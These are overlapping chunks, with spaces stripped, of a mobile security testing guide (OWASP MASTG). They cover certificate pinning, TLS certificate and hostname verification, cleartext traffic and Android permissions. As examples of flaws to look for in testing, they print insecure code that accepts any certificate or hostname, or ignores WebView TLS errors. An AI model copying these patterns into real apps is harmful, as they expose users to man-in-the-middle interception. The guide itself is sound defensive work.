OnCreate(BundlesavedInstanceState) { System.Net.ServicePointManager.ServerCertificateValidationCallback +=ValidateServerCertificate; base.OnCreate(savedInstanceState); SetContentView(Resource.Layout.Main); TesteAsync(\"https://security.claudio.pt\"); } InthisparticularexamplewearepinningtheintermediateCAofthecertificatechain. TheoutputoftheHTTPresponse willbeavailableinthesystemlogs. SampleXamarinappwiththepreviousexamplecanbeobtainedontheMASTGrepository After decompressing the APK file, use a .NET decompiler like dotPeak, ILSpy or dnSpy to decompile the app dlls stored insidethe‘Assemblies’folderandconfirmtheusageoftheServicePointManager. Learnmore: • Certificate and Public Key Pinning with Xamarin - https://thomasbandt.com/certificate-and-public-key-pinning- with-xamarin • ServicePointManager-https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager(v=vs.110).aspx Cordova Applications 237\\nHybrid applications based on Cordova do not support Certificate Pinning natively, so plugins are used to achieve this. The most common one is PhoneGap SSL Certificate Checker. The check method is used to confirm the fingerprint and callbackswilldeterminethenextsteps. //Endpointtoverifyagainstcertificatepinning. varserver =\"https://www.owasp.org\"; //SHA256Fingerprint(Canbeobtainedvia\"openssls_client-connecthostname:443|opensslx509-noout-fingerprint-sha256\" varfingerprint =\"D8EF3CDF7EF644BA04ECD59714BB004A7AF52663 53874E766777F0F4CCED67B9\"; window.plugins.sslCertificateChecker.check( successCallback, errorCallback, server, fingerprint); function successCallback(message){ alert(message); //Messageisalways:CONNECTION_SECURE. //Nowdosomethingwiththetrustedserver. } function errorCallback(message){ alert(message); if(message ===\"CONNECTION_NOT_SECURE\"){ //Thereislikelyamaninthemiddleattackgoingon,becareful! }else if(message.indexOf(\"CONNECTION_FAILED\")>-1){ //Therewasnoconnection(yet).Internetmaybedown.Tryagain(afewtimes)afteralittletimeout. } } AfterdecompressingtheAPKfile,Cordova/Phonegapfileswillbelocatedinthe/assets/wwwfolder. The‘plugins’folderwill giveyouthevisibilityofthepluginsused. WewillneedtosearchforthismethodsintheJavaScriptcodeoftheapplication toconfirmitsusage. Dynamic Analysis Followtheinstructionsfrom“TestingEndpointIdentifyVerification>DynamicAnalysis”. Ifdoingsodoesn’tleadtotraffic beingproxied,itmaymeanthatcertificatepinningisactuallyimplementedandallsecuritymeasuresareinplace. Does thesamehappenforalldomains? As a quick smoke test, you can try to bypass certificate pinning using objection as described in “Bypassing Certificate Pinning”. PinningrelatedAPIsbeinghookedbyobjectionshouldappearinobjection’soutput. However,keepinmindthat:",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 93
    }
  },
  {
    "text": "successCallback(message){ alert(message); //Messageisalways:CONNECTION_SECURE. //Nowdosomethingwiththetrustedserver. } function errorCallback(message){ alert(message); if(message ===\"CONNECTION_NOT_SECURE\"){ //Thereislikelyamaninthemiddleattackgoingon,becareful! }else if(message.indexOf(\"CONNECTION_FAILED\")>-1){ //Therewasnoconnection(yet).Internetmaybedown.Tryagain(afewtimes)afteralittletimeout. } } AfterdecompressingtheAPKfile,Cordova/Phonegapfileswillbelocatedinthe/assets/wwwfolder. The‘plugins’folderwill giveyouthevisibilityofthepluginsused. WewillneedtosearchforthismethodsintheJavaScriptcodeoftheapplication toconfirmitsusage. Dynamic Analysis Followtheinstructionsfrom“TestingEndpointIdentifyVerification>DynamicAnalysis”. Ifdoingsodoesn’tleadtotraffic beingproxied,itmaymeanthatcertificatepinningisactuallyimplementedandallsecuritymeasuresareinplace. Does thesamehappenforalldomains? As a quick smoke test, you can try to bypass certificate pinning using objection as described in “Bypassing Certificate Pinning”. PinningrelatedAPIsbeinghookedbyobjectionshouldappearinobjection’soutput. However,keepinmindthat: • theAPIsmightnotbecomplete. • ifnothingishooked,thatdoesn’tnecessarilymeanthattheappdoesn’timplementpinning. Inbothcases,theapporsomeofitscomponentsmightimplementcustompinninginawaythatissupportedbyobjection. Pleasecheckthestaticanalysissectionforspecificpinningindicatorsandmorein-depthtesting. 238\\nTesting Endpoint Identify Verification Platform: android MASVSV1: MSTG-NETWORK-3 MASVSV2: MASVS-NETWORK-1 Overview Static Analysis UsingTLStotransportsensitiveinformationoverthenetworkisessentialforsecurity. However,encryptingcommunication betweenamobileapplicationanditsbackendAPIisnottrivial. Developersoftendecideonsimplerbutlesssecuresolutions (e.g.,thosethatacceptanycertificate)tofacilitatethedevelopmentprocess,andsometimestheseweaksolutionsmake itintotheproductionversion,potentiallyexposinguserstoman-in-the-middleattacks. Twokeyissuesshouldbeaddressed: • Verifythatacertificatecomesfromatrustedsource,i.e.atrustedCA(CertificateAuthority). • Determinewhethertheendpointserverpresentstherightcertificate. Makesurethatthehostnameandthecertificateitselfareverifiedcorrectly. Examplesandcommonpitfallsareavailable intheofficialAndroiddocumentation. SearchthecodeforexamplesofTrustManagerandHostnameVerifierusage. In thesectionsbelow,youcanfindexamplesofthekindofinsecureusagethatyoushouldlookfor. Notethat fromAndroid8.0(API level 26) onward, thereis no supportfor SSLv3 andHttpsURLConnection willno longerperformafallbacktoaninsecureTLS/SSLprotocol. Verifying the Target SDK Version Applications targeting Android 7.0 (API level 24) or higher will use a default Network Security Configuration that doesn’t trust any user supplied CAs, reducing the possibility of MITM attacks by luring users to install malicious CAs. DecodetheappusingapktoolandverifythatthetargetSdkVersioninapktool.ymlisequaltoorhigherthan24. greptargetSdkVersionUnCrackable-Level3/apktool.yml targetSdkVersion:'28' However, even if targetSdkVersion >=24, the developer can disable default protections by using a custom Network Security Configuration defining a custom trust anchor forcing the app to trust user supplied CAs. See “Analyzing CustomTrustAnchors”. Analyzing Custom Trust Anchors Search for the Network Security Configuration file and inspect any custom <trust-anchors> defining <certificates src=\"user\">(whichshouldbeavoided). Youshouldcarefullyanalyzetheprecedenceofentries: • Ifavalueisnotsetina<domain-config>entryorinaparent<domain-config>,theconfigurationsinplacewillbe basedonthe<base-config> • Ifnotdefinedinthisentry,thedefaultconfigurationswillbeused. TakealookatthisexampleofaNetworkSecurityConfigurationforanapptargetingAndroid9(APIlevel28): 239\\n<?xml version=\"1.0\" encoding=\"utf-8\"?> <network-security-config> <domain-config> <domain includeSubdomains=\"false\">owasp.org</domain> <trust-anchors> <certificates src=\"system\" /> <certificates src=\"user\" /> </trust-anchors> </domain-config> </network-security-config> Someobservations: • There’sno<base-config>,meaningthatthedefaultconfigurationforAndroid9(APIlevel28)orhigherwillbeused forallotherconnections(onlysystemCAwillbetrustedinprinciple). • However,the<domain-config>overridesthedefaultconfigurationallowingtheapptotrustbothsystemanduser CAsfortheindicated<domain>(owasp.org). • Thisdoesn’taffectsubdomainsbecauseofincludeSubdomains=\"false\". PuttingalltogetherwecantranslatetheaboveNetworkSecurityConfigurationto: “theapptrustssystemanduserCAs fortheowasp.orgdomain,excludingitssubdomains. ForanyotherdomainstheappwilltrustthesystemCAsonly”. Verifying the Server Certificate TrustManagerisameansofverifyingconditionsnecessaryforestablishingatrustedconnectioninAndroid. Thefollowing conditionsshouldbecheckedatthispoint: • HasthecertificatebeensignedbyatrustedCA? • Hasthecertificateexpired? • Isthecertificateself-signed? Thefollowingcodesnippetissometimesusedduringdevelopmentandwillacceptanycertificate,overwritingthefunctions checkClientTrusted,checkServerTrusted,andgetAcceptedIssuers. Suchimplementationsshouldbeavoided,and, iftheyarenecessary,theyshouldbeclearlyseparatedfromproductionbuildstoavoidbuilt-insecurityflaws. TrustManager[]trustAllCerts =newTrustManager[]{ newX509TrustManager(){ @Override public X509Certificate[]getAcceptedIssuers(){ return newjava.security.cert.X509Certificate[]{}; } @Override public void checkClientTrusted(X509Certificate[]chain,StringauthType) throws CertificateException { } @Override public void checkServerTrusted(X509Certificate[]chain,StringauthType) throws CertificateException { } } }; //SSLContextcontext context.init(null,trustAllCerts,newSecureRandom()); WebView Server Certificate Verification Sometimes applications use a WebView to render the website associated with the application. This is true of HTML/JavaScript-basedframeworkssuchasApacheCordova,whichusesaninternalWebViewforapplicationinteraction. When a WebView is used, the mobile browser performs the server certificate validation. Ignoring any TLS error that occurswhentheWebViewtriestoconnecttotheremotewebsiteisabadpractice. The following code will ignore TLS issues, exactly like the WebViewClient custom implementation provided to the Web- View: 240\\nWebViewmyWebView =(WebView)findViewById(R.id.webview); myWebView.setWebViewClient(newWebViewClient(){ @Override public void onReceivedSslError(WebViewview,SslErrorHandlerhandler,SslErrorerror){ //IgnoreTLScertificateerrorsandinstructtheWebViewClienttoloadthewebsite handler.proceed(); } }); Apache Cordova Certificate Verification ImplementationoftheApacheCordovaframework’sinternalWebViewusagewillignoreTLSerrorsinthemethodonRe- ceivedSslErroriftheflagandroid:debuggableisenabledintheapplicationmanifest. Therefore, makesurethatthe appisnotdebuggable. Seethetestcase“TestingIftheAppisDebuggable”. Hostname Verification Anothersecurityflawinclient-sideTLSimplementationsisthelackofhostnameverification. Developmentenvironments usuallyuseinternaladdressesinsteadofvaliddomainnames,sodevelopersoftendisablehostnameverification(orforce an application to allow any hostname) and simply forget to change it when their application goes to production. The followingcodedisableshostnameverification: final static HostnameVerifierNO_VERIFY =newHostnameVerifier(){ public boolean verify(Stringhostname,SSLSessionsession){ return true; } }; Withabuilt-inHostnameVerifier,acceptinganyhostnameispossible: HostnameVerifierNO_VERIFY =org.apache.http.conn.ssl.SSLSocketFactory .ALLOW_ALL_HOSTNAME_VERIFIER; Makesurethatyourapplicationverifiesahostnamebeforesettingatrustedconnection. Dynamic Analysis WhentestinganapptargetingAndroid7.0(APIlevel24)orhigheritshouldbeeffectivelyapplyingtheNetworkSecurity Configurationandyoushouldn’tabletoseethedecryptedHTTPStrafficatfirst. However, iftheapptargetsAPIlevels below24,theappwillautomaticallyaccepttheinstalledusercertificates. TotestimpropercertificateverificationlaunchaMITMattackusinganinterceptionproxysuchasBurp. Trythefollowing options: • Self-signedcertificate: 1. InBurp,gototheProxytabandselecttheOptionstab. 2. GototheProxyListenerssection,highlightyourlistener,andclickEdit. 3. GototheCertificatetab,checkUseaself-signedcertificate,andclickOk. 4. Runyourapplication. Ifyou’reabletoseeHTTPStraffic,yourapplicationisacceptingself-signedcertificates. • AcceptingcertificateswithanuntrustedCA: 1. InBurp,gototheProxytabandselecttheOptionstab. 2. GototheProxyListenerssection,highlightyourlistener,andclickEdit. 3. GototheCertificatetab,checkGenerateaCA-signedcertificatewithaspecifichostname,andtype inthebackendserver’shostname. 4. Run your application. If you’re able to see HTTPS traffic, your application is accepting certificates with an untrustedCA. • Acceptingincorrecthostnames: 1. InBurp,gototheProxytabandselecttheOptionstab. 241\\n2. GototheProxyListenerssection,highlightyourlistener,andclickEdit. 3. GototheCertificatetab,checkGenerateaCA-signedcertificatewithaspecifichostname,andtype inaninvalidhostname,e.g.,example.org. 4. Runyourapplication. Ifyou’reabletoseeHTTPStraffic,yourapplicationisacceptingallhostnames. Ifyou’restillnotabletoseeanydecryptedHTTPStraffic,yourapplicationmightbeimplementingcertificatepinning. Testing the Security Provider Platform: android MASVSV1: MSTG-NETWORK-6 MASVSV2: MASVS-NETWORK-1 Overview Static Analysis ApplicationsbasedontheAndroidSDKshoulddependonGooglePlayServices. Forexample,inthegradlebuildfile,youwill findcompile'com.google.android.gms:play-services-gcm:x.x.x'inthedependenciesblock. Youneedtomakesure thattheProviderInstallerclassiscalledwitheitherinstallIfNeededorinstallIfNeededAsync. ProviderInstaller needstobecalledbyacomponentoftheapplicationasearlyaspossible. Exceptionsthrownbythesemethodsshould becaughtandhandledcorrectly. Iftheapplicationcannotpatchitssecurityprovider,itcaneitherinformtheAPIofits lesssecurestateorrestrictuseractions(becauseallHTTPStrafficshouldbedeemedriskierinthissituation). Ifyouhaveaccesstothesourcecode, checkiftheapphandleanyexceptionsrelatedtothesecurityproviderupdates properly, and if it reports to the backend when the application is working",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 94
    }
  },
  {
    "text": "1. InBurp,gototheProxytabandselecttheOptionstab. 241\\n2. GototheProxyListenerssection,highlightyourlistener,andclickEdit. 3. GototheCertificatetab,checkGenerateaCA-signedcertificatewithaspecifichostname,andtype inaninvalidhostname,e.g.,example.org. 4. Runyourapplication. Ifyou’reabletoseeHTTPStraffic,yourapplicationisacceptingallhostnames. Ifyou’restillnotabletoseeanydecryptedHTTPStraffic,yourapplicationmightbeimplementingcertificatepinning. Testing the Security Provider Platform: android MASVSV1: MSTG-NETWORK-6 MASVSV2: MASVS-NETWORK-1 Overview Static Analysis ApplicationsbasedontheAndroidSDKshoulddependonGooglePlayServices. Forexample,inthegradlebuildfile,youwill findcompile'com.google.android.gms:play-services-gcm:x.x.x'inthedependenciesblock. Youneedtomakesure thattheProviderInstallerclassiscalledwitheitherinstallIfNeededorinstallIfNeededAsync. ProviderInstaller needstobecalledbyacomponentoftheapplicationasearlyaspossible. Exceptionsthrownbythesemethodsshould becaughtandhandledcorrectly. Iftheapplicationcannotpatchitssecurityprovider,itcaneitherinformtheAPIofits lesssecurestateorrestrictuseractions(becauseallHTTPStrafficshouldbedeemedriskierinthissituation). Ifyouhaveaccesstothesourcecode, checkiftheapphandleanyexceptionsrelatedtothesecurityproviderupdates properly, and if it reports to the backend when the application is working with an unpatched security provider. The AndroidDeveloperdocumentationprovidesdifferentexamplesshowinghowtoupdatetheSecurityProvidertoprevent SSLexploits. Lastly,makesurethatNDK-basedapplicationsbindonlytoarecentandproperlypatchedlibrarythatprovidesSSL/TLS functionality. Dynamic Analysis Whenyouhavethesourcecode: • Runtheapplicationindebugmode,thencreateabreakpointwheretheappwillfirstcontacttheendpoint(s). • RightclickthehighlightedcodeandselectEvaluate Expression. • TypeSecurity.getProviders()andpressenter. • ChecktheprovidersandtrytofindGmsCore_OpenSSL,whichshouldbethenewtop-listedprovider. Whenyoudonothavethesourcecode: • UseXposedtohookintothejava.securitypackage,thenhookintojava.security.Securitywiththemethod getProviders(withnoarguments). ThereturnvaluewillbeanarrayofProvider. • DeterminewhetherthefirstproviderisGmsCore_OpenSSL. Testing Data Encryption on the Network Platform: android MASVSV1: MSTG-NETWORK-1 MASVSV2: MASVS-NETWORK-1 242\\nOverview Static Analysis Testing Network Requests over Secure Protocols First, you should identify all network requests in the source code and ensure that no plain HTTP URLs are used. Make surethatsensitiveinformationissentoversecurechannelsbyusingHttpsURLConnectionorSSLSocket(forsocket-level communicationusingTLS). Testing Network API Usage Next,evenwhenusingalow-levelAPIwhichissupposedtomakesecureconnections(suchasSSLSocket),beawarethat ithastobesecurelyimplemented. Forinstance,SSLSocketdoesn’tverifythehostname. UsegetDefaultHostnameV- erifiertoverifythehostname. TheAndroiddeveloperdocumentationincludesacodeexample. Testing for Cleartext Traffic Next,youshouldensurethattheappisnotallowingcleartextHTTPtraffic. SinceAndroid9(APIlevel28)cleartextHTTP trafficisblockedbydefault(thankstothedefaultNetworkSecurityConfiguration)buttherearemultiplewaysinwhich anapplicationcanstillsendit: • Setting the android:usesCleartextTraffic attribute of the <application> tag in the AndroidManifest.xml file. NotethatthisflagisignoredincasetheNetworkSecurityConfigurationisconfigured. • Configuring the Network Security Configuration to enable cleartext traffic by setting the cleartextTrafficPer- mittedattributetotrueon<domain-config>elements. • Usinglow-levelAPIs(e.g.Socket)tosetupacustomHTTPconnection. • Usingacross-platformframework(e.g.Flutter,Xamarin,...),asthesetypicallyhavetheirownimplementationsfor HTTPlibraries. Alloftheabovecasesmustbecarefullyanalyzedasawhole. Forexample,eveniftheappdoesnotpermitcleartexttraffic initsAndroidManifestorNetworkSecurityConfiguration,itmightactuallystillbesendingHTTPtraffic. Thatcouldbethe caseifit’susingalow-levelAPI(forwhichNetworkSecurityConfigurationisignored)orabadlyconfiguredcross-platform framework. Formoreinformationrefertothearticle“SecuritywithHTTPSandSSL”. Dynamic Analysis Intercept the tested app’s incoming and outgoing network traffic and make sure that this traffic is encrypted. You can interceptnetworktrafficinanyofthefollowingways: • CaptureallHTTP(S)andWebsockettrafficwithaninterceptionproxylikeOWASPZAPorBurpSuiteandmakesure allrequestsaremadeviaHTTPSinsteadofHTTP. • InterceptionproxieslikeBurpandOWASPZAPwillshowHTTP(S)trafficonly. Youcan,however,useaBurpplugin suchasBurp-non-HTTP-Extensionorthetoolmitm-relaytodecodeandvisualizecommunicationviaXMPPandother protocols. SomeapplicationsmaynotworkwithproxieslikeBurpandOWASPZAPbecauseofCertificatePinning. Insucha scenario,pleasecheck“TestingCustomCertificateStoresandCertificatePinning”. Formoredetailsreferto: • “InterceptingTrafficontheNetworkLayer”fromchapter“MobileAppNetworkCommunication” • “SettingupaNetworkTestingEnvironment”fromchapter“AndroidBasicSecurityTesting” Testing the TLS Settings 243\\nPlatform: android MASVSV1: MSTG-NETWORK-2 MASVSV2: MASVS-NETWORK-1 Overview Refertosection“VerifyingtheTLSSettings”inchapter“MobileAppNetworkCommunication”fordetails. 244\\nAndroid Platform APIs Overview App Permissions Androidassignsadistinctsystemidentity(LinuxuserIDandgroupID)toeveryinstalledapp. BecauseeachAndroidapp operatesinaprocesssandbox,appsmustexplicitlyrequestaccesstoresourcesanddatathatareoutsidetheirsandbox. They request this access by declaring the permissions they need to use system data and features. Depending on how sensitiveorcriticalthedataorfeatureis,theAndroidsystemwillgrantthepermissionautomaticallyorasktheuserto approvetherequest. To enhance user privacy and mitigate privacy risks, it is crucial for Android apps to minimize permission requests and only request access to sensitive information when absolutely necessary. The Android developer documentation offers valuableinsightsandbestpracticestohelpappsachievethesameleveloffunctionalitywithoutrequiringdirectaccess tosensitiveresources: • Minimizeyourpermissionrequests • Apppermissionsbestpractices • PermissionsandAPIsthatAccessSensitiveInformation Android permissions can be classified into distinct categories depending on the extent of restricted data access and permittedactionsthattheygranttoanapp. Thisclassificationincludestheso-called“ProtectionLevel”asshownonthe permissionsAPIreferencepageandAndroidManifest.xmlSourceDefinitions. • Install-time permissions: grant limited access to restricted data or let the app perform restricted actions that minimally affect the system or other apps. They are granted automatically at installation time (Android 6.0 (API level23)orhigher). – ProtectionLevel: normal. Grantsappsaccesstoisolatedapplication-levelfeatureswithminimalrisktoother apps,theuser,andthesystem. Example: android.permission.INTERNET – ProtectionLevel: signature. Grantedonlytoappssignedwiththesamecertificateastheoneusedtosign thedeclaringapp. Example: android.permission.ACCESS_MOCK_LOCATION – ProtectionLevel: systemOrSignature. Reservedforsystem-embeddedappsorthosesignedwiththesame certificate as the one used to sign the declaring app. Example: android.permission.ACCESS_DOWNLOAD_- MANAGER.Oldsynonymforsignature|privileged. DeprecatedinAPIlevel23. • Runtimepermissions: requirepromptingtheuseratruntimeforexplicitapproval. – Protection Level: dangerous. Grant additional access to restricted data or let the app perform restricted actionsthatmoresubstantiallyaffectthesystemandotherapps. • Specialpermissions: requiretheusertonavigatetoSettings>Apps>Specialappaccessandgiveexplicit consent. – ProtectionLevel: appop. Grantaccesstosystemresourcesthatareparticularlysensitivesuchasdisplaying anddrawingoverotherappsoraccessingallstoragedata. • Custompermissionsinordertosharetheirownresourcesandcapabilitieswithotherapps. – ProtectionLevel: normal,signatureordangerous. Independently from the assigned Protection Level, it is important to consider the risk that a permission might be pos- ingconsideringtheadditionalguardedcapabilities, thisisespeciallyimportantforpreloadedapps. Thefollowingtable presentsarepresentativesetofAndroidpermissionscategorizedbyassociatedriskasdefinedinthispaperwhichlever- agesthesetof(privileged)permissionsandentrancepointstoanapptoestimateitsattacksurface. RiskCategory Permissions ProtectionLevel ASTRONOMICAL android.permission.INSTALL_PACKAGES signature 245\\nRiskCategory Permissions ProtectionLevel CRITICAL android.permission.COPY_PROTECTED_DATA signature android.permission.WRITE_SECURE_SETTINGS signature android.permission.READ_FRAME_BUFFER signature android.permission.MANAGE_CA_CERTIFICATES signature android.permission.MANAGE_APP_OPS_MODES signature android.permission.GRANT_RUNTIME_PERMISSIONS signature android.permission.DUMP signature android.permission.CAMERA dangerous android.permission.SYSTEM_CAMERA systemOrSignature android.permission.MANAGE_PROFILE_AND_DEVICE_OWNERS signature android.permission.MOUNT_UNMOUNT_FILESYSTEMS signature HIGH android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS signature android.permission.READ_SMS dangerous android.permission.WRITE_SMS normal android.permission.RECEIVE_MMS dangerous android.permission.SEND_SMS_NO_CONFIRMATION signature android.permission.RECEIVE_SMS dangerous android.permission.READ_LOGS signature android.permission.READ_PRIVILEGED_PHONE_STATE signature android.permission.LOCATION_HARDWARE signature android.permission.ACCESS_FINE_LOCATION",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 95
    }
  },
  {
    "text": "ProtectionLevel ASTRONOMICAL android.permission.INSTALL_PACKAGES signature 245\\nRiskCategory Permissions ProtectionLevel CRITICAL android.permission.COPY_PROTECTED_DATA signature android.permission.WRITE_SECURE_SETTINGS signature android.permission.READ_FRAME_BUFFER signature android.permission.MANAGE_CA_CERTIFICATES signature android.permission.MANAGE_APP_OPS_MODES signature android.permission.GRANT_RUNTIME_PERMISSIONS signature android.permission.DUMP signature android.permission.CAMERA dangerous android.permission.SYSTEM_CAMERA systemOrSignature android.permission.MANAGE_PROFILE_AND_DEVICE_OWNERS signature android.permission.MOUNT_UNMOUNT_FILESYSTEMS signature HIGH android.permission.INSTALL_GRANT_RUNTIME_PERMISSIONS signature android.permission.READ_SMS dangerous android.permission.WRITE_SMS normal android.permission.RECEIVE_MMS dangerous android.permission.SEND_SMS_NO_CONFIRMATION signature android.permission.RECEIVE_SMS dangerous android.permission.READ_LOGS signature android.permission.READ_PRIVILEGED_PHONE_STATE signature android.permission.LOCATION_HARDWARE signature android.permission.ACCESS_FINE_LOCATION dangerous android.permission.ACCESS_BACKGROUND_LOCATION dangerous android.permission.BIND_ACCESSIBILITY_SERVICE signature android.permission.ACCESS_WIFI_STATE normal com.android.voicemail.permission.READ_VOICEMAIL signature android.permission.RECORD_AUDIO dangerous android.permission.CAPTURE_AUDIO_OUTPUT signature android.permission.ACCESS_NOTIFICATIONS signature android.permission.INTERACT_ACROSS_USERS_FULL signature android.permission.BLUETOOTH_PRIVILEGED signature android.permission.GET_PASSWORD signature android.permission.INTERNAL_SYSTEM_WINDOW signature MEDIUM android.permission.ACCESS_COARSE_LOCATION dangerous android.permission.CHANGE_COMPONENT_ENABLED_STATE signature android.permission.READ_CONTACTS dangerous android.permission.WRITE_CONTACTS dangerous android.permission.CONNECTIVITY_INTERNAL signature android.permission.ACCESS_MEDIA_LOCATION dangerous android.permission.READ_EXTERNAL_STORAGE dangerous android.permission.WRITE_EXTERNAL_STORAGE dangerous android.permission.SYSTEM_ALERT_WINDOW signature android.permission.READ_CALL_LOG dangerous 246\\nRiskCategory Permissions ProtectionLevel android.permission.WRITE_CALL_LOG dangerous android.permission.INTERACT_ACROSS_USERS signature android.permission.MANAGE_USERS signature android.permission.READ_CALENDAR dangerous android.permission.BLUETOOTH_ADMIN normal android.permission.BODY_SENSORS dangerous LOW android.permission.DOWNLOAD_WITHOUT_NOTIFICATION normal android.permission.PACKAGE_USAGE_STATS signature android.permission.MASTER_CLEAR signature android.permission.DELETE_PACKAGES normal android.permission.GET_PACKAGE_SIZE normal android.permission.BLUETOOTH normal android.permission.DEVICE_POWER signature NONE android.permission.ACCESS_NETWORK_STATE normal android.permission.RECEIVE_BOOT_COMPLETED normal android.permission.WAKE_LOCK normal android.permission.FLASHLIGHT normal android.permission.VIBRATE normal android.permission.WRITE_MEDIA_STORAGE signature android.permission.MODIFY_AUDIO_SETTINGS normal Notethatthiscategorizationcanchangeovertime. Thepapergivesusanexampleofthat: PriortoAndroid10, theREAD_PHONE_STATEpermissionwouldbeclassifiedasHIGH,duetothepermanentdevice identifiers (e.g. (IMEI/MEID, IMSI, SIM, and build serial) that it guards. However, starting from Android 10, a bulk of the sensitive information that can be used for tracking has been moved, refactored or rescoped into a new permissioncalledREAD_PRIVILEGED_PHONE_STATE,puttingthenewpermissionintheHIGHcategory,butresulting intheREAD_PHONE_STATEpermissionmovingtoLOW. Permission Changes per API Level Android8.0(APIlevel26)Changes: ThefollowingchangesaffectallappsrunningonAndroid8.0(APIlevel26),eventothoseappstargetinglowerAPIlevels. • Contacts provider usage stats change: when an app requests the READ_CONTACTS permission, queries for contact’susagedatawillreturnapproximationsratherthanexactvalues(theauto-completeAPIisnotaffectedby thischange). AppstargetingAndroid8.0(APIlevel26)orhigherareaffectedbythefollowing: • Account access and discoverability improvements: Appscannolongergetaccesstouseraccountsonlyby havingtheGET_ACCOUNTSpermissiongranted,unlesstheauthenticatorownstheaccountsortheusergrantsthat access. • New telephony permissions: the following permissions (classified as dangerous) are now part of the PHONE permissionsgroup: – The ANSWER_PHONE_CALLS permission allows to answer incoming phone calls programmatically (via accep- tRingingCall). 247\\n– TheREAD_PHONE_NUMBERSpermissiongrantsreadaccesstothephonenumbersstoredinthedevice. • Restrictions when granting dangerous permissions: Dangerous permissions are classified into permission groups(e.g.theSTORAGEgroupcontainsREAD_EXTERNAL_STORAGEandWRITE_EXTERNAL_STORAGE).BeforeAndroid 8.0 (API level 26), it was sufficient to request one permission of the group in order to get all permissions of that group also granted at the same time. This has changed starting at Android 8.0 (API level 26): whenever an app requests a permission at runtime, the system will grant exclusively that specific permission. However, note that allsubsequentrequestsforpermissionsinthatpermissiongroupwillbeautomaticallygrantedwithout showingthepermissionsdialogtotheuser. SeethisexamplefromtheAndroiddeveloperdocumentation: SupposeanapplistsbothREAD_EXTERNAL_STORAGEandWRITE_EXTERNAL_STORAGEinitsmanifest. The apprequestsREAD_EXTERNAL_STORAGEandtheusergrantsit. IftheapptargetsAPIlevel25orlower,the systemalsograntsWRITE_EXTERNAL_STORAGEatthesametime,becauseitbelongstothesameSTORAGE permissiongroupandisalsoregisteredinthemanifest. IftheapptargetsAndroid8.0(APIlevel26),thesystem grants only READ_EXTERNAL_STORAGE at that time; however, if the app later requests WRITE_EXTERNAL_- STORAGE,thesystemimmediatelygrantsthatprivilegewithoutpromptingtheuser. YoucanseethelistofpermissiongroupsintheAndroiddeveloperdocumentation. Tomakethisabitmoreconfusing, Googlealsowarnsthatparticularpermissionsmightbemovedfromonegrouptoanotherinfutureversionsofthe AndroidSDKandtherefore,thelogicoftheappshouldn’trelyonthestructureofthesepermissiongroups. Thebest practiceistoexplicitlyrequesteverypermissionwheneverit’sneeded. Android9(APILevel28)Changes: ThefollowingchangesaffectallappsrunningonAndroid9,eventothoseappstargetingAPIlevelslowerthan28. • Restricted access to call logs: READ_CALL_LOG, WRITE_CALL_LOG, and PROCESS_OUTGOING_CALLS (dangerous) permissionsare moved fromPHONE to the new CALL_LOG permissiongroup. This means that being able to make phonecalls(e.g.byhavingthepermissionsofthePHONEgroupgranted)isnotsufficienttogetaccesstothecall logs. • Restricted access to phone numbers: apps wanting to read the phone number require the READ_CALL_LOG permissionwhenrunningonAndroid9(APIlevel28). • RestrictedaccesstoWi-Filocationandconnectioninformation: SSIDandBSSIDvaluescannotberetrieved (e.g.viaWifiManager.getConnectionInfounlessallofthefollowingistrue: – TheACCESS_FINE_LOCATIONorACCESS_COARSE_LOCATIONpermission. – TheACCESS_WIFI_STATEpermission. – Locationservicesareenabled(underSettings->Location). AppstargetingAndroid9(APIlevel28)orhigherareaffectedbythefollowing: • Buildserialnumberdeprecation: device’shardwareserialnumbercannotberead(e.g.viaBuild.getSerial) unlesstheREAD_PHONE_STATE(dangerous)permissionisgranted. Android10(APIlevel29)Changes: Android10(APIlevel29)introducesseveraluserprivacyenhancements. Thechangesregardingpermissionsaffecttoall appsrunningonAndroid10(APIlevel29),includingthosetargetinglowerAPIlevels. • RestrictedLocationaccess: newpermissionoptionforlocationaccess“onlywhileusingtheapp”. • Scopedstoragebydefault: appstargetingAndroid10(APIlevel29)don’tneedtodeclareanystoragepermission toaccesstheirfilesintheappspecificdirectoryinexternalstorageaswellasforfilescreatesfromthemediastore. • Restricted access to screen contents: READ_FRAME_BUFFER,CAPTURE_VIDEO_OUTPUT,andCAPTURE_SECURE_- VIDEO_OUTPUT permissions are now signature-access only, which prevents silent access to the device’s screen contents. • User-facing permission check on legacy apps: when running an app targeting Android 5.1 (API level 22) or lowerforthefirsttime,userswillbepromptedwithapermissionsscreenwheretheycanrevokeaccesstospecific legacypermissions(whichpreviouslywouldbeautomaticallygrantedatinstallationtime). Permission Enforcement ActivityPermissionEnforcement: 248\\nPermissions are applied via android:permission attribute within the <activity> tag in the manifest. These permis- sionsrestrictwhichapplicationscanstartthatActivity. ThepermissionischeckedduringContext.startActivityand Activity.startActivityForResult. NotholdingtherequiredpermissionresultsinaSecurityExceptionbeingthrown fromthecall. ServicePermissionEnforcement: Permissions applied via android:permission attribute within the <service> tag in the",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 96
    }
  },
  {
    "text": "legacy apps: when running an app targeting Android 5.1 (API level 22) or lowerforthefirsttime,userswillbepromptedwithapermissionsscreenwheretheycanrevokeaccesstospecific legacypermissions(whichpreviouslywouldbeautomaticallygrantedatinstallationtime). Permission Enforcement ActivityPermissionEnforcement: 248\\nPermissions are applied via android:permission attribute within the <activity> tag in the manifest. These permis- sionsrestrictwhichapplicationscanstartthatActivity. ThepermissionischeckedduringContext.startActivityand Activity.startActivityForResult. NotholdingtherequiredpermissionresultsinaSecurityExceptionbeingthrown fromthecall. ServicePermissionEnforcement: Permissions applied via android:permission attribute within the <service> tag in the manifest restrict who can start orbindtotheassociatedService. ThepermissionischeckedduringContext.startService,Context.stopServiceand Context.bindService. NotholdingtherequiredpermissionresultsinaSecurityExceptionbeingthrownfromthecall. BroadcastPermissionEnforcement: Permissionsappliedviaandroid:permissionattributewithinthe<receiver>tagrestrictaccesstosendbroadcaststothe associatedBroadcastReceiver. TheheldpermissionsarecheckedafterContext.sendBroadcastreturns, whiletrying todeliverthesentbroadcasttothegivenreceiver. Notholdingtherequiredpermissionsdoesn’tthrowanexception,the resultisanunsentbroadcast. 